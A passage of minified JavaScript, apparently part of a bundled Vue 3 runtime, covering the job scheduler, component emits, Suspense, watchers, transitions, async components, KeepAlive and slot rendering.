invalidateJob(e){const t=queue.indexOf(e);t>flushIndex&&queue.splice(t,1)}function queuePostFlushCb(e){isArray$2(e)?pendingPostFlushCbs.push(...e):(!activePostFlushCbs||!activePostFlushCbs.includes(e,e.allowRecurse?postFlushIndex+1:postFlushIndex))&&pendingPostFlushCbs.push(e),queueFlush()}function flushPreFlushCbs(e,t=isFlushing?flushIndex+1:0){for(;t<queue.length;t++){const n=queue[t];n&&n.pre&&(queue.splice(t,1),t--,n())}}function flushPostFlushCbs(e){if(pendingPostFlushCbs.length){const t=[...new Set(pendingPostFlushCbs)];if(pendingPostFlushCbs.length=0,activePostFlushCbs){activePostFlushCbs.push(...t);return}for(activePostFlushCbs=t,activePostFlushCbs.sort((n,s)=>getId(n)-getId(s)),postFlushIndex=0;postFlushIndex<activePostFlushCbs.length;postFlushIndex++)activePostFlushCbs[postFlushIndex]();activePostFlushCbs=null,postFlushIndex=0}}const getId=e=>e.id==null?1/0:e.id,comparator=(e,t)=>{const n=getId(e)-getId(t);if(n===0){if(e.pre&&!t.pre)return-1;if(t.pre&&!e.pre)return 1}return n};function flushJobs(e){isFlushPending=!1,isFlushing=!0,queue.sort(comparator);const t=NOOP;try{for(flushIndex=0;flushIndex<queue.length;flushIndex++){const n=queue[flushIndex];n&&n.active!==!1&&callWithErrorHandling(n,null,14)}}finally{flushIndex=0,queue.length=0,flushPostFlushCbs(),isFlushing=!1,currentFlushPromise=null,(queue.length||pendingPostFlushCbs.length)&&flushJobs()}}let devtools$1,buffer=[];function setDevtoolsHook(e,t){var n,s;devtools$1=e,devtools$1?(devtools$1.enabled=!0,buffer.forEach(({event:r,args:o})=>devtools$1.emit(r,...o)),buffer=[]):typeof window<"u"&&window.HTMLElement&&!((s=(n=window.navigator)==null?void 0:n.userAgent)!=null&&s.includes("jsdom"))?((t.__VUE_DEVTOOLS_HOOK_REPLAY__=t.__VUE_DEVTOOLS_HOOK_REPLAY__||[]).push(o=>{setDevtoolsHook(o,t)}),setTimeout(()=>{devtools$1||(t.__VUE_DEVTOOLS_HOOK_REPLAY__=null,buffer=[])},3e3)):buffer=[]}function emit(e,t,...n){if(e.isUnmounted)return;const s=e.vnode.props||EMPTY_OBJ;let r=n;const o=t.startsWith("update:"),l=o&&t.slice(7);if(l&&l in s){const m=`${l==="modelValue"?"model":l}Modifiers`,{number:g,trim:y}=s[m]||EMPTY_OBJ;y&&(r=n.map(v=>isString$2(v)?v.trim():v)),g&&(r=n.map(looseToNumber))}let d,u=s[d=toHandlerKey(t)]||s[d=toHandlerKey(camelize(t))];!u&&o&&(u=s[d=toHandlerKey(hyphenate(t))]),u&&callWithAsyncErrorHandling(u,e,6,r);const f=s[d+"Once"];if(f){if(!e.emitted)e.emitted={};else if(e.emitted[d])return;e.emitted[d]=!0,callWithAsyncErrorHandling(f,e,6,r)}}function normalizeEmitsOptions(e,t,n=!1){const s=t.emitsCache,r=s.get(e);if(r!==void 0)return r;const o=e.emits;let l={},d=!1;if(!isFunction$1(e)){const u=f=>{const m=normalizeEmitsOptions(f,t,!0);m&&(d=!0,extend(l,m))};!n&&t.mixins.length&&t.mixins.forEach(u),e.extends&&u(e.extends),e.mixins&&e.mixins.forEach(u)}return!o&&!d?(isObject$2(e)&&s.set(e,null),null):(isArray$2(o)?o.forEach(u=>l[u]=null):extend(l,o),isObject$2(e)&&s.set(e,l),l)}function isEmitListener(e,t){return!e||!isOn(t)?!1:(t=t.slice(2).replace(/Once$/,""),hasOwn$1(e,t[0].toLowerCase()+t.slice(1))||hasOwn$1(e,hyphenate(t))||hasOwn$1(e,t))}let currentRenderingInstance=null,currentScopeId=null;function setCurrentRenderingInstance(e){const t=currentRenderingInstance;return currentRenderingInstance=e,currentScopeId=e&&e.type.__scopeId||null,t}function pushScopeId(e){currentScopeId=e}function popScopeId(){currentScopeId=null}const withScopeId=e=>withCtx;function withCtx(e,t=currentRenderingInstance,n){if(!t||e._n)return e;const s=(...r)=>{s._d&&setBlockTracking(-1);const o=setCurrentRenderingInstance(t);let l;try{l=e(...r)}finally{setCurrentRenderingInstance(o),s._d&&setBlockTracking(1)}return l};return s._n=!0,s._c=!0,s._d=!0,s}function markAttrsAccessed(){}function renderComponentRoot(e){const{type:t,vnode:n,proxy:s,withProxy:r,props:o,propsOptions:[l],slots:d,attrs:u,emit:f,render:m,renderCache:g,data:y,setupState:v,ctx:x,inheritAttrs:E}=e;let S,w;const k=setCurrentRenderingInstance(e);try{if(n.shapeFlag&4){const R=r||s;S=normalizeVNode(m.call(R,R,g,o,v,y,x)),w=u}else{const R=t;S=normalizeVNode(R.length>1?R(o,{attrs:u,slots:d,emit:f}):R(o,null)),w=t.props?u:getFunctionalFallthrough(u)}}catch(R){blockStack.length=0,handleError(R,e,1),S=createVNode(Comment)}let C=S;if(w&&E!==!1){const R=Object.keys(w),{shapeFlag:L}=C;R.length&&L&7&&(l&&R.some(isModelListener)&&(w=filterModelListeners(w,l)),C=cloneVNode(C,w))}return n.dirs&&(C=cloneVNode(C),C.dirs=C.dirs?C.dirs.concat(n.dirs):n.dirs),n.transition&&(C.transition=n.transition),S=C,setCurrentRenderingInstance(k),S}function filterSingleRoot(e){let t;for(let n=0;n<e.length;n++){const s=e[n];if(isVNode$1(s)){if(s.type!==Comment||s.children==="v-if"){if(t)return;t=s}}else return}return t}const getFunctionalFallthrough=e=>{let t;for(const n in e)(n==="class"||n==="style"||isOn(n))&&((t||(t={}))[n]=e[n]);return t},filterModelListeners=(e,t)=>{const n={};for(const s in e)(!isModelListener(s)||!(s.slice(9)in t))&&(n[s]=e[s]);return n};function shouldUpdateComponent(e,t,n){const{props:s,children:r,component:o}=e,{props:l,children:d,patchFlag:u}=t,f=o.emitsOptions;if(t.dirs||t.transition)return!0;if(n&&u>=0){if(u&1024)return!0;if(u&16)return s?hasPropsChanged(s,l,f):!!l;if(u&8){const m=t.dynamicProps;for(let g=0;g<m.length;g++){const y=m[g];if(l[y]!==s[y]&&!isEmitListener(f,y))return!0}}}else return(r||d)&&(!d||!d.$stable)?!0:s===l?!1:s?l?hasPropsChanged(s,l,f):!0:!!l;return!1}function hasPropsChanged(e,t,n){const s=Object.keys(t);if(s.length!==Object.keys(e).length)return!0;for(let r=0;r<s.length;r++){const o=s[r];if(t[o]!==e[o]&&!isEmitListener(n,o))return!0}return!1}function updateHOCHostEl({vnode:e,parent:t},n){for(;t&&t.subTree===e;)(e=t.vnode).el=n,t=t.parent}const isSuspense=e=>e.__isSuspense,SuspenseImpl={name:"Suspense",__isSuspense:!0,process(e,t,n,s,r,o,l,d,u,f){e==null?mountSuspense(t,n,s,r,o,l,d,u,f):patchSuspense(e,t,n,s,r,l,d,u,f)},hydrate:hydrateSuspense,create:createSuspenseBoundary,normalize:normalizeSuspenseChildren},Suspense=SuspenseImpl;function triggerEvent(e,t){const n=e.props&&e.props[t];isFunction$1(n)&&n()}function mountSuspense(e,t,n,s,r,o,l,d,u){const{p:f,o:{createElement:m}}=u,g=m("div"),y=e.suspense=createSuspenseBoundary(e,r,s,t,g,n,o,l,d,u);f(null,y.pendingBranch=e.ssContent,g,null,s,y,o,l),y.deps>0?(triggerEvent(e,"onPending"),triggerEvent(e,"onFallback"),f(null,e.ssFallback,t,n,s,null,o,l),setActiveBranch(y,e.ssFallback)):y.resolve(!1,!0)}function patchSuspense(e,t,n,s,r,o,l,d,{p:u,um:f,o:{createElement:m}}){const g=t.suspense=e.suspense;g.vnode=t,t.el=e.el;const y=t.ssContent,v=t.ssFallback,{activeBranch:x,pendingBranch:E,isInFallback:S,isHydrating:w}=g;if(E)g.pendingBranch=y,isSameVNodeType(y,E)?(u(E,y,g.hiddenContainer,null,r,g,o,l,d),g.deps<=0?g.resolve():S&&(u(x,v,n,s,r,null,o,l,d),setActiveBranch(g,v))):(g.pendingId++,w?(g.isHydrating=!1,g.activeBranch=E):f(E,r,g),g.deps=0,g.effects.length=0,g.hiddenContainer=m("div"),S?(u(null,y,g.hiddenContainer,null,r,g,o,l,d),g.deps<=0?g.resolve():(u(x,v,n,s,r,null,o,l,d),setActiveBranch(g,v))):x&&isSameVNodeType(y,x)?(u(x,y,n,s,r,g,o,l,d),g.resolve(!0)):(u(null,y,g.hiddenContainer,null,r,g,o,l,d),g.deps<=0&&g.resolve()));else if(x&&isSameVNodeType(y,x))u(x,y,n,s,r,g,o,l,d),setActiveBranch(g,y);else if(triggerEvent(t,"onPending"),g.pendingBranch=y,g.pendingId++,u(null,y,g.hiddenContainer,null,r,g,o,l,d),g.deps<=0)g.resolve();else{const{timeout:k,pendingId:C}=g;k>0?setTimeout(()=>{g.pendingId===C&&g.fallback(v)},k):k===0&&g.fallback(v)}}function createSuspenseBoundary(e,t,n,s,r,o,l,d,u,f,m=!1){const{p:g,m:y,um:v,n:x,o:{parentNode:E,remove:S}}=f;let w;const k=isVNodeSuspensible(e);k&&t!=null&&t.pendingBranch&&(w=t.pendingId,t.deps++);const C=e.props?toNumber(e.props.timeout):void 0,R={vnode:e,parent:t,parentComponent:n,isSVG:l,container:s,hiddenContainer:r,anchor:o,deps:0,pendingId:0,timeout:typeof C=="number"?C:-1,activeBranch:null,pendingBranch:null,isInFallback:!0,isHydrating:m,isUnmounted:!1,effects:[],resolve(L=!1,O=!1){const{vnode:I,activeBranch:A,pendingBranch:j,pendingId:G,effects:X,parentComponent:q,container:J}=R;if(R.isHydrating)R.isHydrating=!1;else if(!L){const se=A&&j.transition&&j.transition.mode==="out-in";se&&(A.transition.afterLeave=()=>{G===R.pendingId&&y(j,J,de,0)});let{anchor:de}=R;A&&(de=x(A),v(A,q,R,!0)),se||y(j,J,de,0)}setActiveBranch(R,j),R.pendingBranch=null,R.isInFallback=!1;let K=R.parent,le=!1;for(;K;){if(K.pendingBranch){K.effects.push(...X),le=!0;break}K=K.parent}le||queuePostFlushCb(X),R.effects=[],k&&t&&t.pendingBranch&&w===t.pendingId&&(t.deps--,t.deps===0&&!O&&t.resolve()),triggerEvent(I,"onResolve")},fallback(L){if(!R.pendingBranch)return;const{vnode:O,activeBranch:I,parentComponent:A,container:j,isSVG:G}=R;triggerEvent(O,"onFallback");const X=x(I),q=()=>{R.isInFallback&&(g(null,L,j,X,A,null,G,d,u),setActiveBranch(R,L))},J=L.transition&&L.transition.mode==="out-in";J&&(I.transition.afterLeave=q),R.isInFallback=!0,v(I,A,null,!0),J||q()},move(L,O,I){R.activeBranch&&y(R.activeBranch,L,O,I),R.container=L},next(){return R.activeBranch&&x(R.activeBranch)},registerDep(L,O){const I=!!R.pendingBranch;I&&R.deps++;const A=L.vnode.el;L.asyncDep.catch(j=>{handleError(j,L,0)}).then(j=>{if(L.isUnmounted||R.isUnmounted||R.pendingId!==L.suspenseId)return;L.asyncResolved=!0;const{vnode:G}=L;handleSetupResult(L,j,!1),A&&(G.el=A);const X=!A&&L.subTree.el;O(L,G,E(A||L.subTree.el),A?null:x(L.subTree),R,l,u),X&&S(X),updateHOCHostEl(L,G.el),I&&--R.deps===0&&R.resolve()})},unmount(L,O){R.isUnmounted=!0,R.activeBranch&&v(R.activeBranch,n,L,O),R.pendingBranch&&v(R.pendingBranch,n,L,O)}};return R}function hydrateSuspense(e,t,n,s,r,o,l,d,u){const f=t.suspense=createSuspenseBoundary(t,s,n,e.parentNode,document.createElement("div"),null,r,o,l,d,!0),m=u(e,f.pendingBranch=t.ssContent,n,f,o,l);return f.deps===0&&f.resolve(!1,!0),m}function normalizeSuspenseChildren(e){const{shapeFlag:t,children:n}=e,s=t&32;e.ssContent=normalizeSuspenseSlot(s?n.default:n),e.ssFallback=s?normalizeSuspenseSlot(n.fallback):createVNode(Comment)}function normalizeSuspenseSlot(e){let t;if(isFunction$1(e)){const n=isBlockTreeEnabled&&e._c;n&&(e._d=!1,openBlock()),e=e(),n&&(e._d=!0,t=currentBlock,closeBlock())}return isArray$2(e)&&(e=filterSingleRoot(e)),e=normalizeVNode(e),t&&!e.dynamicChildren&&(e.dynamicChildren=t.filter(n=>n!==e)),e}function queueEffectWithSuspense(e,t){t&&t.pendingBranch?isArray$2(e)?t.effects.push(...e):t.effects.push(e):queuePostFlushCb(e)}function setActiveBranch(e,t){e.activeBranch=t;const{vnode:n,parentComponent:s}=e,r=n.el=t.el;s&&s.subTree===n&&(s.vnode.el=r,updateHOCHostEl(s,r))}function isVNodeSuspensible(e){var t;return((t=e.props)==null?void 0:t.suspensible)!=null&&e.props.suspensible!==!1}function watchEffect(e,t){return doWatch(e,null,t)}function watchPostEffect(e,t){return doWatch(e,null,{flush:"post"})}function watchSyncEffect(e,t){return doWatch(e,null,{flush:"sync"})}const INITIAL_WATCHER_VALUE={};function watch(e,t,n){return doWatch(e,t,n)}function doWatch(e,t,{immediate:n,deep:s,flush:r,onTrack:o,onTrigger:l}=EMPTY_OBJ){var d;const u=getCurrentScope()===((d=currentInstance)==null?void 0:d.scope)?currentInstance:null;let f,m=!1,g=!1;if(isRef(e)?(f=()=>e.value,m=isShallow(e)):isReactive(e)?(f=()=>e,s=!0):isArray$2(e)?(g=!0,m=e.some(R=>isReactive(R)||isShallow(R)),f=()=>e.map(R=>{if(isRef(R))return R.value;if(isReactive(R))return traverse(R);if(isFunction$1(R))return callWithErrorHandling(R,u,2)})):isFunction$1(e)?t?f=()=>callWithErrorHandling(e,u,2):f=()=>{if(!(u&&u.isUnmounted))return y&&y(),callWithAsyncErrorHandling(e,u,3,[v])}:f=NOOP,t&&s){const R=f;f=()=>traverse(R())}let y,v=R=>{y=k.onStop=()=>{callWithErrorHandling(R,u,4)}},x;if(isInSSRComponentSetup)if(v=NOOP,t?n&&callWithAsyncErrorHandling(t,u,3,[f(),g?[]:void 0,v]):f(),r==="sync"){const R=useSSRContext();x=R.__watcherHandles||(R.__watcherHandles=[])}else return NOOP;let E=g?new Array(e.length).fill(INITIAL_WATCHER_VALUE):INITIAL_WATCHER_VALUE;const S=()=>{if(k.active)if(t){const R=k.run();(s||m||(g?R.some((L,O)=>hasChanged(L,E[O])):hasChanged(R,E)))&&(y&&y(),callWithAsyncErrorHandling(t,u,3,[R,E===INITIAL_WATCHER_VALUE?void 0:g&&E[0]===INITIAL_WATCHER_VALUE?[]:E,v]),E=R)}else k.run()};S.allowRecurse=!!t;let w;r==="sync"?w=S:r==="post"?w=()=>queuePostRenderEffect(S,u&&u.suspense):(S.pre=!0,u&&(S.id=u.uid),w=()=>queueJob(S));const k=new ReactiveEffect(f,w);t?n?S():E=k.run():r==="post"?queuePostRenderEffect(k.run.bind(k),u&&u.suspense):k.run();const C=()=>{k.stop(),u&&u.scope&&remove(u.scope.effects,k)};return x&&x.push(C),C}function instanceWatch(e,t,n){const s=this.proxy,r=isString$2(e)?e.includes(".")?createPathGetter(s,e):()=>s[e]:e.bind(s,s);let o;isFunction$1(t)?o=t:(o=t.handler,n=t);const l=currentInstance;setCurrentInstance(this);const d=doWatch(r,o.bind(s),n);return l?setCurrentInstance(l):unsetCurrentInstance(),d}function createPathGetter(e,t){const n=t.split(".");return()=>{let s=e;for(let r=0;r<n.length&&s;r++)s=s[n[r]];return s}}function traverse(e,t){if(!isObject$2(e)||e.__v_skip||(t=t||new Set,t.has(e)))return e;if(t.add(e),isRef(e))traverse(e.value,t);else if(isArray$2(e))for(let n=0;n<e.length;n++)traverse(e[n],t);else if(isSet(e)||isMap(e))e.forEach(n=>{traverse(n,t)});else if(isPlainObject$1(e))for(const n in e)traverse(e[n],t);return e}function withDirectives(e,t){const n=currentRenderingInstance;if(n===null)return e;const s=getExposeProxy(n)||n.proxy,r=e.dirs||(e.dirs=[]);for(let o=0;o<t.length;o++){let[l,d,u,f=EMPTY_OBJ]=t[o];l&&(isFunction$1(l)&&(l={mounted:l,updated:l}),l.deep&&traverse(d),r.push({dir:l,instance:s,value:d,oldValue:void 0,arg:u,modifiers:f}))}return e}function invokeDirectiveHook(e,t,n,s){const r=e.dirs,o=t&&t.dirs;for(let l=0;l<r.length;l++){const d=r[l];o&&(d.oldValue=o[l].value);let u=d.dir[s];u&&(pauseTracking(),callWithAsyncErrorHandling(u,n,8,[e.el,d,e,t]),resetTracking())}}function useTransitionState(){const e={isMounted:!1,isLeaving:!1,isUnmounting:!1,leavingVNodes:new Map};return onMounted(()=>{e.isMounted=!0}),onBeforeUnmount(()=>{e.isUnmounting=!0}),e}const TransitionHookValidator=[Function,Array],BaseTransitionPropsValidators={mode:String,appear:Boolean,persisted:Boolean,onBeforeEnter:TransitionHookValidator,onEnter:TransitionHookValidator,onAfterEnter:TransitionHookValidator,onEnterCancelled:TransitionHookValidator,onBeforeLeave:TransitionHookValidator,onLeave:TransitionHookValidator,onAfterLeave:TransitionHookValidator,onLeaveCancelled:TransitionHookValidator,onBeforeAppear:TransitionHookValidator,onAppear:TransitionHookValidator,onAfterAppear:TransitionHookValidator,onAppearCancelled:TransitionHookValidator},BaseTransitionImpl={name:"BaseTransition",props:BaseTransitionPropsValidators,setup(e,{slots:t}){const n=getCurrentInstance(),s=useTransitionState();let r;return()=>{const o=t.default&&getTransitionRawChildren(t.default(),!0);if(!o||!o.length)return;let l=o[0];if(o.length>1){for(const E of o)if(E.type!==Comment){l=E;break}}const d=toRaw(e),{mode:u}=d;if(s.isLeaving)return emptyPlaceholder(l);const f=getKeepAliveChild(l);if(!f)return emptyPlaceholder(l);const m=resolveTransitionHooks(f,d,s,n);setTransitionHooks(f,m);const g=n.subTree,y=g&&getKeepAliveChild(g);let v=!1;const{getTransitionKey:x}=f.type;if(x){const E=x();r===void 0?r=E:E!==r&&(r=E,v=!0)}if(y&&y.type!==Comment&&(!isSameVNodeType(f,y)||v)){const E=resolveTransitionHooks(y,d,s,n);if(setTransitionHooks(y,E),u==="out-in")return s.isLeaving=!0,E.afterLeave=()=>{s.isLeaving=!1,n.update.active!==!1&&n.update()},emptyPlaceholder(l);u==="in-out"&&f.type!==Comment&&(E.delayLeave=(S,w,k)=>{const C=getLeavingNodesForType(s,y);C[String(y.key)]=y,S._leaveCb=()=>{w(),S._leaveCb=void 0,delete m.delayedLeave},m.delayedLeave=k})}return l}}},BaseTransition=BaseTransitionImpl;function getLeavingNodesForType(e,t){const{leavingVNodes:n}=e;let s=n.get(t.type);return s||(s=Object.create(null),n.set(t.type,s)),s}function resolveTransitionHooks(e,t,n,s){const{appear:r,mode:o,persisted:l=!1,onBeforeEnter:d,onEnter:u,onAfterEnter:f,onEnterCancelled:m,onBeforeLeave:g,onLeave:y,onAfterLeave:v,onLeaveCancelled:x,onBeforeAppear:E,onAppear:S,onAfterAppear:w,onAppearCancelled:k}=t,C=String(e.key),R=getLeavingNodesForType(n,e),L=(A,j)=>{A&&callWithAsyncErrorHandling(A,s,9,j)},O=(A,j)=>{const G=j[1];L(A,j),isArray$2(A)?A.every(X=>X.length<=1)&&G():A.length<=1&&G()},I={mode:o,persisted:l,beforeEnter(A){let j=d;if(!n.isMounted)if(r)j=E||d;else return;A._leaveCb&&A._leaveCb(!0);const G=R[C];G&&isSameVNodeType(e,G)&&G.el._leaveCb&&G.el._leaveCb(),L(j,[A])},enter(A){let j=u,G=f,X=m;if(!n.isMounted)if(r)j=S||u,G=w||f,X=k||m;else return;let q=!1;const J=A._enterCb=K=>{q||(q=!0,K?L(X,[A]):L(G,[A]),I.delayedLeave&&I.delayedLeave(),A._enterCb=void 0)};j?O(j,[A,J]):J()},leave(A,j){const G=String(e.key);if(A._enterCb&&A._enterCb(!0),n.isUnmounting)return j();L(g,[A]);let X=!1;const q=A._leaveCb=J=>{X||(X=!0,j(),J?L(x,[A]):L(v,[A]),A._leaveCb=void 0,R[G]===e&&delete R[G])};R[G]=e,y?O(y,[A,q]):q()},clone(A){return resolveTransitionHooks(A,t,n,s)}};return I}function emptyPlaceholder(e){if(isKeepAlive(e))return e=cloneVNode(e),e.children=null,e}function getKeepAliveChild(e){return isKeepAlive(e)?e.children?e.children[0]:void 0:e}function setTransitionHooks(e,t){e.shapeFlag&6&&e.component?setTransitionHooks(e.component.subTree,t):e.shapeFlag&128?(e.ssContent.transition=t.clone(e.ssContent),e.ssFallback.transition=t.clone(e.ssFallback)):e.transition=t}function getTransitionRawChildren(e,t=!1,n){let s=[],r=0;for(let o=0;o<e.length;o++){let l=e[o];const d=n==null?l.key:String(n)+String(l.key!=null?l.key:o);l.type===Fragment?(l.patchFlag&128&&r++,s=s.concat(getTransitionRawChildren(l.children,t,d))):(t||l.type!==Comment)&&s.push(d!=null?cloneVNode(l,{key:d}):l)}if(r>1)for(let o=0;o<s.length;o++)s[o].patchFlag=-2;return s}function defineComponent(e,t){return isFunction$1(e)?(()=>extend({name:e.name},t,{setup:e}))():e}const isAsyncWrapper=e=>!!e.type.__asyncLoader;function defineAsyncComponent(e){isFunction$1(e)&&(e={loader:e});const{loader:t,loadingComponent:n,errorComponent:s,delay:r=200,timeout:o,suspensible:l=!0,onError:d}=e;let u=null,f,m=0;const g=()=>(m++,u=null,y()),y=()=>{let v;return u||(v=u=t().catch(x=>{if(x=x instanceof Error?x:new Error(String(x)),d)return new Promise((E,S)=>{d(x,()=>E(g()),()=>S(x),m+1)});throw x}).then(x=>v!==u&&u?u:(x&&(x.__esModule||x[Symbol.toStringTag]==="Module")&&(x=x.default),f=x,x)))};return defineComponent({name:"AsyncComponentWrapper",__asyncLoader:y,get __asyncResolved(){return f},setup(){const v=currentInstance;if(f)return()=>createInnerComp(f,v);const x=k=>{u=null,handleError(k,v,13,!s)};if(l&&v.suspense||isInSSRComponentSetup)return y().then(k=>()=>createInnerComp(k,v)).catch(k=>(x(k),()=>s?createVNode(s,{error:k}):null));const E=ref(!1),S=ref(),w=ref(!!r);return r&&setTimeout(()=>{w.value=!1},r),o!=null&&setTimeout(()=>{if(!E.value&&!S.value){const k=new Error(`Async component timed out after ${o}ms.`);x(k),S.value=k}},o),y().then(()=>{E.value=!0,v.parent&&isKeepAlive(v.parent.vnode)&&queueJob(v.parent.update)}).catch(k=>{x(k),S.value=k}),()=>{if(E.value&&f)return createInnerComp(f,v);if(S.value&&s)return createVNode(s,{error:S.value});if(n&&!w.value)return createVNode(n)}}})}function createInnerComp(e,t){const{ref:n,props:s,children:r,ce:o}=t.vnode,l=createVNode(e,s,r);return l.ref=n,l.ce=o,delete t.vnode.ce,l}const isKeepAlive=e=>e.type.__isKeepAlive,KeepAliveImpl={name:"KeepAlive",__isKeepAlive:!0,props:{include:[String,RegExp,Array],exclude:[String,RegExp,Array],max:[String,Number]},setup(e,{slots:t}){const n=getCurrentInstance(),s=n.ctx;if(!s.renderer)return()=>{const k=t.default&&t.default();return k&&k.length===1?k[0]:k};const r=new Map,o=new Set;let l=null;const d=n.suspense,{renderer:{p:u,m:f,um:m,o:{createElement:g}}}=s,y=g("div");s.activate=(k,C,R,L,O)=>{const I=k.component;f(k,C,R,0,d),u(I.vnode,k,C,R,I,d,L,k.slotScopeIds,O),queuePostRenderEffect(()=>{I.isDeactivated=!1,I.a&&invokeArrayFns(I.a);const A=k.props&&k.props.onVnodeMounted;A&&invokeVNodeHook(A,I.parent,k)},d)},s.deactivate=k=>{const C=k.component;f(k,y,null,1,d),queuePostRenderEffect(()=>{C.da&&invokeArrayFns(C.da);const R=k.props&&k.props.onVnodeUnmounted;R&&invokeVNodeHook(R,C.parent,k),C.isDeactivated=!0},d)};function v(k){resetShapeFlag(k),m(k,n,d,!0)}function x(k){r.forEach((C,R)=>{const L=getComponentName(C.type);L&&(!k||!k(L))&&E(R)})}function E(k){const C=r.get(k);!l||!isSameVNodeType(C,l)?v(C):l&&resetShapeFlag(l),r.delete(k),o.delete(k)}watch(()=>[e.include,e.exclude],([k,C])=>{k&&x(R=>matches(k,R)),C&&x(R=>!matches(C,R))},{flush:"post",deep:!0});let S=null;const w=()=>{S!=null&&r.set(S,getInnerChild(n.subTree))};return onMounted(w),onUpdated(w),onBeforeUnmount(()=>{r.forEach(k=>{const{subTree:C,suspense:R}=n,L=getInnerChild(C);if(k.type===L.type&&k.key===L.key){resetShapeFlag(L);const O=L.component.da;O&&queuePostRenderEffect(O,R);return}v(k)})}),()=>{if(S=null,!t.default)return null;const k=t.default(),C=k[0];if(k.length>1)return l=null,k;if(!isVNode$1(C)||!(C.shapeFlag&4)&&!(C.shapeFlag&128))return l=null,C;let R=getInnerChild(C);const L=R.type,O=getComponentName(isAsyncWrapper(R)?R.type.__asyncResolved||{}:L),{include:I,exclude:A,max:j}=e;if(I&&(!O||!matches(I,O))||A&&O&&matches(A,O))return l=R,C;const G=R.key==null?L:R.key,X=r.get(G);return R.el&&(R=cloneVNode(R),C.shapeFlag&128&&(C.ssContent=R)),S=G,X?(R.el=X.el,R.component=X.component,R.transition&&setTransitionHooks(R,R.transition),R.shapeFlag|=512,o.delete(G),o.add(G)):(o.add(G),j&&o.size>parseInt(j,10)&&E(o.values().next().value)),R.shapeFlag|=256,l=R,isSuspense(C.type)?C:R}}},KeepAlive=KeepAliveImpl;function matches(e,t){return isArray$2(e)?e.some(n=>matches(n,t)):isString$2(e)?e.split(",").includes(t):isRegExp$1(e)?e.test(t):!1}function onActivated(e,t){registerKeepAliveHook(e,"a",t)}function onDeactivated(e,t){registerKeepAliveHook(e,"da",t)}function registerKeepAliveHook(e,t,n=currentInstance){const s=e.__wdc||(e.__wdc=()=>{let r=n;for(;r;){if(r.isDeactivated)return;r=r.parent}return e()});if(injectHook(t,s,n),n){let r=n.parent;for(;r&&r.parent;)isKeepAlive(r.parent.vnode)&&injectToKeepAliveRoot(s,t,n,r),r=r.parent}}function injectToKeepAliveRoot(e,t,n,s){const r=injectHook(t,e,s,!0);onUnmounted(()=>{remove(s[t],r)},n)}function resetShapeFlag(e){e.shapeFlag&=-257,e.shapeFlag&=-513}function getInnerChild(e){return e.shapeFlag&128?e.ssContent:e}function injectHook(e,t,n=currentInstance,s=!1){if(n){const r=n[e]||(n[e]=[]),o=t.__weh||(t.__weh=(...l)=>{if(n.isUnmounted)return;pauseTracking(),setCurrentInstance(n);const d=callWithAsyncErrorHandling(t,n,e,l);return unsetCurrentInstance(),resetTracking(),d});return s?r.unshift(o):r.push(o),o}}const createHook=e=>(t,n=currentInstance)=>(!isInSSRComponentSetup||e==="sp")&&injectHook(e,(...s)=>t(...s),n),onBeforeMount=createHook("bm"),onMounted=createHook("m"),onBeforeUpdate=createHook("bu"),onUpdated=createHook("u"),onBeforeUnmount=createHook("bum"),onUnmounted=createHook("um"),onServerPrefetch=createHook("sp"),onRenderTriggered=createHook("rtg"),onRenderTracked=createHook("rtc");function onErrorCaptured(e,t=currentInstance){injectHook("ec",e,t)}const COMPONENTS="components",DIRECTIVES="directives";function resolveComponent(e,t){return resolveAsset(COMPONENTS,e,!0,t)||e}const NULL_DYNAMIC_COMPONENT=Symbol.for("v-ndc");function resolveDynamicComponent(e){return isString$2(e)?resolveAsset(COMPONENTS,e,!1)||e:e||NULL_DYNAMIC_COMPONENT}function resolveDirective(e){return resolveAsset(DIRECTIVES,e)}function resolveAsset(e,t,n=!0,s=!1){const r=currentRenderingInstance||currentInstance;if(r){const o=r.type;if(e===COMPONENTS){const d=getComponentName(o,!1);if(d&&(d===t||d===camelize(t)||d===capitalize$1(camelize(t))))return o}const l=resolve$1(r[e]||o[e],t)||resolve$1(r.appContext[e],t);return!l&&s?o:l}}function resolve$1(e,t){return e&&(e[t]||e[camelize(t)]||e[capitalize$1(camelize(t))])}function renderList(e,t,n,s){let r;const o=n&&n[s];if(isArray$2(e)||isString$2(e)){r=new Array(e.length);for(let l=0,d=e.length;l<d;l++)r[l]=t(e[l],l,void 0,o&&o[l])}else if(typeof e=="number"){r=new Array(e);for(let l=0;l<e;l++)r[l]=t(l+1,l,void 0,o&&o[l])}else if(isObject$2(e))if(e[Symbol.iterator])r=Array.from(e,(l,d)=>t(l,d,void 0,o&&o[d]));else{const l=Object.keys(e);r=new Array(l.length);for(let d=0,u=l.length;d<u;d++){const f=l[d];r[d]=t(e[f],f,d,o&&o[d])}}else r=[];return n&&(n[s]=r),r}function createSlots(e,t){for(let n=0;n<t.length;n++){const s=t[n];if(isArray$2(s))for(let r=0;r<s.length;r++)e[s[r].name]=s[r].fn;else s&&(e[s.name]=s.key?(...r)=>{const o=s.fn(...r);return o&&(o.key=s.key),o}:s.fn)}return e}function renderSlot(e,t,n={},s,r){if(currentRenderingInstance.isCE||currentRenderingInstance.parent&&isAsyncWrapper(currentRenderingInstance.parent)&&currentRenderingInstance.parent.isCE)return t!=="default"&&(n.name=t),createVNode("slot",n,s&&s());let o=e[t];o&&o._c&&(o._d=!1),openBlock();const l=o&&ensureValidVNode(o(n)),d=createBlock(Fragment,{key:n.key||l&&l.key||`_${t}`},l||(s?s():[]),l&&e._===1?64:-2);return!r&&d.scopeId&&(d.slotScopeIds=[d.scopeId+"-s"]),o&&o._c&&(o._d=!0),d}function ensureValidVNode(e){return e.some(t=>isVNode$1(t)?!(t.type===Comment||t.type===Fragment&&!ensureValidVNode(t.children)):!0)?e:null}function toHandlers(e,t){const n={};for(const s in e)n[t&&/[A-Z]/.test(s)?`on:${s}`:toHandlerKey(s)]=e[s];return n}const 